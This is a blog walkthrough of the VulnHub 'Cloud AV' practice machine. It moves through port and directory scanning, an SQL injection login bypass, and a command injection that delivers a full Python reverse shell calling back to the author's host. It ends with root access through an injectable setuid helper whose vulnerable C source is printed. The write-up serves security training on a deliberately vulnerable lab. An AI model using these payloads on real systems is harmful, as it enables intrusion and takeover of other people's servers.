---
layout: post
cover: False
cover: ''
title: "[VulnHub] - BoredHackerBlog: Cloud AV - Walkthrough"
date:   2020-04-03 03:18:00
tags: CTF Vulnhub Hacking ITsecurity
categories: 'ctf'
navigation: True
---
Hi, here is my solution to get roon on `BoredHackerBlog: Cloud AV` VM, you can download it from [here](https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/).
`BoredHackerBlog: Cloud AV` is an fun and easy machine that required simple webapp skills in order to get in the server.


`cloudanti="10.10.10.131" `

### NMAP

`nmap` shows only two ports are open on `TCP` which are `22` and `8080` and here is the banner and `HTTP` methods for port `8080` : 
```bash
Supported Methods: HEAD OPTIONS GET
Werkzeug/0.14.1 Python/2.7.15rc1
```
### Port `8080`
```sh
yas3r@linux[~/CTF/CloudAVI]$ curl http://$cloudanti:8080                                                    
<html> 
<body>
<h1>Cloud Anti-Virus Scanner!</h1>
<h2>This is a beta Cloud Anti-Virus Scanner service.</h2>
<h3>Please enter your invite code to start testing</h3>
<form action="/login" method="POST">
  <input type="text" name="password" placeholder="Invite Code">
  <input type="submit" value="Log in">
</form>
</body>
</html>%                                                                                                                                                                                                             yas3r@linux[~/CTF/CloudAVI]$ 
```

### Initial DIR scan

```bash
yas3r@linux[~/CTF/CloudAVI]$ gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$cloudanti:8080 -fw      

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.131:8080/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2020/04/03 00:43:07 Starting gobuster
=====================================================
/console (Status: 200)
/scan (Status: 200)
=====================================================
2020/04/03 00:43:22 Finished
=====================================================

```

### SQL Injection
Trying couple of SQL injection payload to get the `errors` - and the code to bypass the invitation code is: `" or "a"="a`

```sh
POST /login HTTP/1.1
Host: 10.10.10.131:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://10.10.10.131:8080
Connection: close
Referer: http://10.10.10.131:8080/
Upgrade-Insecure-Requests: 1

password=" or "a"="a
```

Response:
```sh
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 74
Vary: Cookie
Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XobZzQ.Ii8girHtRHrlsDNy9esq7cdcbP0; HttpOnly; Path=/
Server: Werkzeug/0.14.1 Python/2.7.15+
Date: Fri, 03 Apr 2020 06:38:05 GMT

Redirecting to /scan. <meta http-equiv="refresh" content="0; url=/scan" />
```

### RCE and Reverseshell

On `scan` page, first tried couple of RCE injection payloads but the one that works is `|` by testing to ping my machine and check `tcpdump` on any icmp packets.
Here is the `RCE` that works for me using `python` reverse shell:

```sh
POST /output HTTP/1.1
Host: 10.10.10.131:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.10.10.131:8080
Connection: close
Referer: http://10.10.10.131:8080/scan
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XobZ2Q.YnahFyrao7H7zM0q_ZfMrFU7I-A
Upgrade-Insecure-Requests: 1

filename=netcat|python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.10.1",80))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("/bin/bash")'
```

[Reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

On the other Terminal
```sh
yas3r@linux[~]$ sudo nc -l -p  80
scanner@cloudav:~/cloudav_app$ 
```

```sh
scanner@cloudav:~/cloudav_app$ export TERM=linux
scanner@cloudav:~/cloudav_app$ ls -l
ls -l
total 16
-rw-rw-r-- 1 scanner scanner 1550 Oct 24  2018 app.py
-rw-r--r-- 1 scanner scanner 2048 Oct 21  2018 database.sql
drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 samples
drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 templates
scanner@cloudav:~/cloudav_app$ 
```
Found a database file that been used by the webapp using `sqlite3` driver that has couple of invitation codes.

### `databases.sql`
```bash
root@cloudav:/home/scanner/cloudav_app# strings database.sql 
SQLite format 3
itablen<
]tablecodecode
CREATE TABLE `code` (
	`password`	TEXT
/mostsecurescanner
#cloudavtech
1mysecondinvitecode
+myinvitecode123
```

### PrivEsc 

Found a file that has special permissions: `update_cloudav` and by checking the source code of the application, we can see that
it run freshclam to update the database.

```bash
scanner@cloudav:~$ ls -l         
ls -l
total 20
drwxrwxr-x 4 scanner scanner 4096 Oct 24  2018 cloudav_app
-rwsr-xr-x 1 root    scanner 8576 Oct 24  2018 update_cloudav
-rw-rw-r-- 1 scanner scanner  393 Oct 24  2018 update_cloudav.c

loudav_app  update_cloudav  update_cloudav.c
scanner@cloudav:~$ cat *.c   
cat *.c
#include <stdio.h>

int main(int argc, char *argv[])
{
char *freshclam="/usr/bin/freshclam";

if (argc < 2){
printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
return 1;
}

char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setgid(0);
setuid(0);
system(command);
return 0;
}
```

### RCE as `root`
Getting root by injecting `OS command injection`.

```bash
scanner@cloudav:~$ ./update_cloudav
./update_cloudav
This tool lets you update antivirus rules
Please supply command line arguments for freshclam
scanner@cloudav:~$
scanner@cloudav:~$ ./update_cloudav "; /bin/bash"
./update_cloudav "; /bin/bash"
ERROR: /var/log/clamav/freshclam.log is locked by another process
ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).
ERROR: initialize: libfreshclam init failed.
ERROR: Initialization error!
root@cloudav:~#
```

Hope you like it.

@yaserfaraj
